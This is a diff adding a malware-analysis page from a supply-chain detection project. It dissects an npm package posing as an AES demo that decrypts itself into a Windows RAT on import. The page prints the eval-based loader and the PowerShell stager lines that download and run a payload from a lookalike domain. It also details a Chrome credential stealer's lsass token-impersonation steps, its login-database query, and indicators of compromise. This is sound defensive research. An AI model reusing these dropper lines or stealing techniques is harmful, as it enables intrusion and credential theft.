@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>aes-decode-runner-pro: an &#39;AES demo&#39; that decrypts itself into a RAT - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="aes-decode-runner-pro: an &#39;AES demo&#39; that decrypts itself into a RAT - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>aes-decode-runner-pro: an &#39;AES demo&#39; that decrypts itself into a RAT</h1>
+    <span class="post-meta">2026-05-27 &middot; npm &middot; aes-decode-runner-pro</span>
+  </div>
+  <div class="post-body discovery-body">
+    <p>Dressed up as an AES-GCM tutorial library — two real codec deps wired in so the math actually works — <code>aes-decode-runner-pro</code> fires its chain the moment you <code>require()</code> it:</p>
+<pre class="lang-js"><code><span class="tok-com">// index.js</span>
+<span class="tok-kw">const</span> pkg = <span class="tok-builtin">require</span>(<span class="tok-str">"./custom-codec"</span>);
+pkg.<span class="tok-fn">run</span>();
+module.exports = pkg;
+</code></pre>
+<p><code>run</code> pulls a 6 KB AES-GCM ciphertext and key material out of <code>defaults.js</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Variable</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ciphertext</td>
+<td><code>DEFAULT_FINAL_ENCODED_TEXT</code> (6 KB)</td>
+</tr>
+<tr>
+<td>Passphrase</td>
+<td><code>default-dev-passphrase</code></td>
+</tr>
+<tr>
+<td>Salt</td>
+<td><code>encode-npm-c-salt</code></td>
+</tr>
+<tr>
+<td>KDF</td>
+<td>scrypt</td>
+</tr>
+</tbody>
+</table>
+<p>then peels three reversed codec layers and hands the plaintext to <code>new Function(&quot;require&quot;, runnable)(require)</code> — <code>eval</code> with one indirection, so a static reader's eye slides off it.</p>
+<ul>
+<li><code>aes-256-gcm</code></li>
+<li><code>encode-decode-codec</code></li>
+<li><code>position-unit-codec</code></li>
+</ul>
+<p>The decrypted JS is a self-deleting PowerShell stager:</p>
+<pre class="lang-js"><code><span class="tok-kw">const</span> key = <span class="tok-str">"AB59097(*^^zxcvbn"</span>;
+<span class="tok-kw">const</span> number = <span class="tok-str">"69 52 42 52 105 59 38 42 113 152 …"</span>; <span class="tok-com">// 224 ints</span>
+<span class="tok-com">// per-byte: k = key[j]+103; out = k &gt;= num ? k - num : num</span>
+fs.<span class="tok-fn">writeFileSync</span>(<span class="tok-str">"settings.ps1"</span>, decoded);
+<span class="tok-builtin">require</span>(<span class="tok-str">"child_process"</span>).<span class="tok-fn">exec</span>(<span class="tok-str">'powershell -ExecutionPolicy Bypass -File ./settings.ps1'</span>)
+  .<span class="tok-fn">on</span>(<span class="tok-str">"exit"</span>, () =&gt; fs.<span class="tok-fn">unlinkSync</span>(<span class="tok-str">"settings.ps1"</span>));
+</code></pre>
+<p>Its three operative lines:</p>
+<pre class="lang-ps1"><code>curl.exe -k -o "$env:TEMP\winPatch.zip" http://nvidiadriver.net/verv1432/winpatch-bd9e.win
+Expand-Archive -Force -Path "$env:TEMP\winPatch.zip" -DestinationPath "$env:TEMP\winPatch"
+wscript "$env:TEMP\winPatch\update.vbs"
+</code></pre>
+<p>The 6 MB zip ships a complete CPython 3.10 runtime plus three Nuitka-compiled <code>.pyd</code> modules whose compressed constants hide the C2 URL — yet <code>cleave analyze</code> still fires twelve <code>winpatch</code> rules off the leftover Unicode constant table:</p>
+<ul>
+<li><code>chost.exe</code> — <code>python.exe</code> unmodified, PDB <code>D:\_w\1\b\bin\amd64\python.pdb</code>, PSF cert intact</li>
+<li>Three <code>.pyd</code> modules — confirmed Nuitka by their constants:
+<ul>
+<li><code>__nuitka_version__</code></li>
+<li><code>__compiled__</code></li>
+<li><code>PyMarshal_ReadObjectFromString</code></li>
+</ul>
+</li>
+</ul>
+<p><strong><code>audiodriver.cp310-win_amd64.pyd</code> — the RAT dispatcher</strong>, every constant stamped with the <code>0825</code> campaign tag:</p>
+<table>
+<thead>
+<tr>
+<th>Constant</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SVR0825URL</code></td>
+<td>C2 endpoint passed into <code>api.htxp0825Exchange</code></td>
+</tr>
+<tr>
+<td><code>MACHINE0825HOST</code>, <code>genUUID0825</code>, <code>PID0825NAME</code></td>
+<td>host / install / process fingerprint</td>
+</tr>
+<tr>
+<td><code>DURATION0825ERROR_WAIT</code></td>
+<td>backoff between failed exchanges</td>
+</tr>
+<tr>
+<td><code>REG0825PATH</code>, <code>REG0825KEY</code> → <code>regStartup</code></td>
+<td><code>HKEY_CURRENT_USER\…\Run</code> → <code>wscript.exe &quot;…update.vbs&quot;</code></td>
+</tr>
+<tr>
+<td><code>COMMAND0825{AUTO,EXIT,INFORMATION,TERMINAL,FILE_UPLOAD,FILE_DOWNLOAD,WAIT}</code></td>
+<td>seven verbs, dispatched to matching <code>process0825*</code> handlers</td>
+</tr>
+<tr>
+<td><code>AUTO0825CHROME_COOKIE</code></td>
+<td>parameter passed to <code>auto.pyd</code> when <code>COMMAND0825AUTO</code> fires</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>api.cp310-win_amd64.pyd</code> — the <code>htxp</code> transport</strong>, an ARC4-encrypted, MD5-checksummed body POSTed as <code>application/octet-stream</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Constant</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>packet0825make</code>, <code>packet0825decode</code></td>
+<td>encode/decode the wire frame</td>
+</tr>
+<tr>
+<td><code>Crypto.Cipher.ARC4.new</code>, <code>.encrypt</code> / <code>.decrypt</code></td>
+<td>symmetric body cipher</td>
+</tr>
+<tr>
+<td><code>hashlib.md5</code>, <code>.digest</code>, <code>SUM_LENGTH</code></td>
+<td>per-packet checksum</td>
+</tr>
+<tr>
+<td><code>requests.post</code>, <code>Content-Type: application/octet-stream</code></td>
+<td>HTTP carrier</td>
+</tr>
+<tr>
+<td><code>urandom</code>, <code>KEY_LENGTH</code></td>
+<td>per-session ARC4 key</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>auto.cp310-win_amd64.pyd</code> — the Chrome ABE stealer</strong>, the part most npm-dropped stealers skip: to reach the SYSTEM-scoped v20 app-bound key it impersonates <code>lsass.exe</code>, then decrypts three browser stores and hands the loot back over <code>htxp</code>.</p>
+<ol>
+<li>Enable <code>SeDebugPrivilege</code></li>
+<li>Open <code>lsass.exe</code></li>
+<li>Duplicate its primary token</li>
+<li>Call <code>NCryptOpenKey(&quot;Google Chromekey1&quot;)</code> under that impersonation</li>
+<li>Use the returned key to unwrap <code>app_bound_encrypted_key</code> from <code>Local State</code></li>
+</ol>
+<ul>
+<li><code>Login Data</code> (saved-logins SQLite)</li>
+<li>the cookie database</li>
+<li><code>Local Extension Settings</code> (where browser-wallet extensions live)</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Constant</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>aSeDebugPrivilege</code>, <code>aTokenImpersonation</code>, <code>aSecurityImpersonation</code></td>
+<td>SYSTEM elevation primitives</td>
+</tr>
+<tr>
+<td><code>alssass_token</code>, <code>aimppersonation_token</code></td>
+<td>family-unique typos cleave keys off</td>
+</tr>
+<tr>
+<td><code>aNCryptOpenStorageProvider(&quot;Microsoft Software Key Storage Provider&quot;)</code></td>
+<td>CNG handle</td>
+</tr>
+<tr>
+<td><code>aNCryptOpenKey(&quot;Google Chromekey1&quot;)</code></td>
+<td>Chrome's named ABE key</td>
+</tr>
+<tr>
+<td><code>app_bound_encrypted_key</code>, <code>axor_key</code></td>
+<td><code>Local State</code> field + XOR-wrap step</td>
+</tr>
+<tr>
+<td><code>SELECT origin_url, username_value, password_value, date_created FROM logins</code></td>
+<td><code>Login Data</code> SQLite read</td>
+</tr>
+<tr>
+<td><code>aautoCookieMode</code>, <code>aautoGatherMode</code>, <code>azipDirectories</code></td>
+<td>cookies + <code>Local Extension Settings</code> (wallets) packaged</td>
+</tr>
+<tr>
+<td><code>uchrome_logins_dump.txt</code>, <code>uChrome Saved Logins Dump</code></td>
+<td>output filename + banner</td>
+</tr>
+</tbody>
+</table>
+<p>Winpatch used to arrive via cracked-software lures and fake installers; seeing its <code>0825</code> tooling ride npm instead means a small JavaScript front-end is now a comfortable enough place to hide a Windows native stealer.</p>
+<h2 id="traits-observed" tabindex="-1"><a class="header-anchor" href="#traits-observed"><span>Traits observed</span></a></h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/install-hook/library/import-time-eval</code></td>
+<td><code>require()</code> of the package calls <code>pkg.run()</code> → <code>new Function(&quot;require&quot;, …)(require)</code> on a decrypted blob</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/anti-static/obfuscation/encoding/aes-gcm-static-key</code></td>
+<td>Stage-1 JS is <code>aes-256-gcm</code> with passphrase, salt, and ciphertext all hardcoded in <code>defaults.js</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/execution/network-stage/curl-powershell-vbs</code></td>
+<td><code>curl.exe -k</code> → <code>Expand-Archive</code> → <code>wscript update.vbs</code> chain written by the decrypted stager</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>well-known/malware/rat/winpatch</code></td>
+<td>Winpatch RAT family — cleave matches twelve campaign rules (<code>campaign-htxp-exchange</code>, <code>svr-url-key</code>, <code>campaign-uuid-helper</code>, six <code>cmd-*</code>, <code>chrome-cookie-task</code>, <code>stealer-cookie-dump-banner</code>, <code>stealer-dump-filename</code>) plus <code>stealer-lssass-typo</code> and <code>stealer-impersonation-typo</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/credential-access/browser/chromium/app-bound-key-theft</code></td>
+<td><code>aNCryptOpenStorageProvider(&quot;Microsoft Software Key Storage Provider&quot;)</code> → <code>aNCryptOpenKey(&quot;Google Chromekey1&quot;)</code> → <code>app_bound_encrypted_key</code> + <code>xor_key</code>, gated by <code>SeDebugPrivilege</code> + <code>lsass.exe</code> token impersonation</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/exfiltration/stealer/credential/browser/chrome-login-data-sqlite</code></td>
+<td><code>SELECT origin_url, username_value, password_value, date_created FROM logins</code> → <code>chrome_logins_dump.txt</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/command-and-control/remote-access/custom-protocol/arc4-md5</code></td>
+<td><code>htxp0825Exchange</code> posts ARC4-encrypted, MD5-checksummed <code>application/octet-stream</code> bodies to <code>SVR0825URL</code> with seven <code>COMMAND0825…</code> verbs</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/persistence/login/registry/autostart</code></td>
+<td><code>HKCU\…\Run</code> writes <code>wscript.exe …update.vbs</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/anti-static/packing/nuitka/standalone</code></td>
+<td>Three <code>.pyd</code> modules with <code>__nuitka_version__</code>, <code>__compiled__</code>, <code>PyMarshal_ReadObjectFromString</code>; constants hidden in compressed blob</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/evasion/masquerade/identity/legitimate-binary</code></td>
+<td><code>chost.exe</code> is unmodified CPython 3.10 <code>python.exe</code> renamed (PDB <code>python.pdb</code>, PSF cert string)</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/command-and-control/infrastructure/typosquat-domain</code></td>
+<td><code>nvidiadriver.net</code> lookalike on Hetzner, Express + helmet front-end serving <code>winpatch-bd9e.win</code> as <code>win-driver-bd9e.zip</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/evasion/self-delete/file/script</code></td>
+<td><code>fs.unlinkSync(&quot;settings.ps1&quot;)</code> on the stager's <code>exit</code> event</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/package/npm</code></td>
+<td>Empty <code>author</code>, no repo URL, 10 versions in 24 h, declared <code>start</code>/<code>test</code>/<code>decode</code> scripts all point at a <code>crypto/lib.min.js</code> not shipped in the tarball</td>
+</tr>
+</tbody>
+</table>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Package</td>
+<td><code>aes-decode-runner-pro@1.0.9</code> (npm)</td>
+</tr>
+<tr>
+<td>npm page</td>
+<td><a href="https://www.npmjs.com/package/aes-decode-runner-pro">npmjs.com/package/aes-decode-runner-pro</a></td>
+</tr>
+<tr>
+<td>Published</td>
+<td><code>2026-05-26T16:24:58Z</code> (<code>1.0.10</code> followed 19 min later)</td>
+</tr>
+<tr>
+<td>Tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/b7ebd4ee16d33e8210f48b3f2b1ef8e894d9726ee4d687c7e9a6c4d1b3043b40"><code>b7ebd4ee16d33e8210f48b3f2b1ef8e894d9726ee4d687c7e9a6c4d1b3043b40</code></a></td>
+</tr>
+<tr>
+<td>Tarball SHA-1 (npm <code>shasum</code>)</td>
+<td><code>44add86a440f1c2928604298f0f8e49685d5086a</code></td>
+</tr>
+<tr>
+<td><code>src/config/defaults.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/1a7ab170e96f20a25eba56b9fcecee5cf4e49ba51533f5504f40e48ec52161de"><code>1a7ab170e96f20a25eba56b9fcecee5cf4e49ba51533f5504f40e48ec52161de</code></a></td>
+</tr>
+<tr>
+<td>AES key material</td>
+<td>passphrase <code>default-dev-passphrase</code>, salt <code>encode-npm-c-salt</code>, scrypt → aes-256-gcm</td>
+</tr>
+<tr>
+<td>XOR key (Stage-2 PS1)</td>
+<td><code>AB59097(*^^zxcvbn</code> (<code>k = key[j]+103; out = k≥n ? k-n : n</code>)</td>
+</tr>
+<tr>
+<td>Stage-2 URL</td>
+<td><code>http://nvidiadriver.net/verv1432/winpatch-bd9e.win</code> → <code>95.216.92.207</code> (Hetzner)</td>
+</tr>
+<tr>
+<td>Stage-2 zip SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/ddd5bd20fd92d4671073096c3e9230e9d3465588f6f7db0abb9618ed3339312a"><code>ddd5bd20fd92d4671073096c3e9230e9d3465588f6f7db0abb9618ed3339312a</code></a> (6,016,747 B)</td>
+</tr>
+<tr>
+<td><code>chost.exe</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/94a83686261e9364cf3386b61a01a9f70936e8547da8962d16f1f850226b8954"><code>94a83686261e9364cf3386b61a01a9f70936e8547da8962d16f1f850226b8954</code></a> (CPython 3.10 <code>python.exe</code>)</td>
+</tr>
+<tr>
+<td><code>api.cp310-win_amd64.pyd</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf"><code>50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf</code></a></td>
+</tr>
+<tr>
+<td><code>audiodriver.cp310-win_amd64.pyd</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3"><code>164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3</code></a></td>
+</tr>
+<tr>
+<td><code>auto.cp310-win_amd64.pyd</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871"><code>17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871</code></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td><code>HKCU\…\Run</code> → <code>wscript.exe &quot;$env:TEMP\winPatch\update.vbs&quot;</code></td>
+</tr>
+<tr>
+<td>Family</td>
+<td>Winpatch (cleave <code>well-known/malware/rat/winpatch</code>, traits revision <code>52c161754</code>)</td>
+</tr>
+<tr>
+<td>Family fingerprints</td>
+<td>Typo identifiers <code>lssass_token</code> and <code>imppersonation_token</code>; <code>0825</code> campaign tag on every command, transport, and helper constant; <code>htxp0825Exchange</code> ARC4+MD5 wire format</td>
+</tr>
+<tr>
+<td>Publisher</td>
+<td><code>abdrizak &lt;aabdirizak13@gmail.com&gt;</code></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
